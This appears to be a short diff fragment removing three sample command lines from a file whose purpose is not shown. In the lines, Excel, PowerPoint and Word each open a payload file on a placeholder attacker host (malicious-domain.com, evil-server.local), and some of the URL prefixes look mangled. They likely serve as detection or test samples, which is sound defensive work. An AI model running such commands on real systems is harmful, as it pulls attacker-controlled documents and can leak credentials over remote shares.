@@ -1,3 +1,0 @@
-EXCEL.EXE "ftmalicious-domain.com/payload.csv"
-POWERPNT.EXE "filmalicious-domain.com/share/payload.pptx"
-WINWORD.EXE \evil-server.local\share\payload.docx
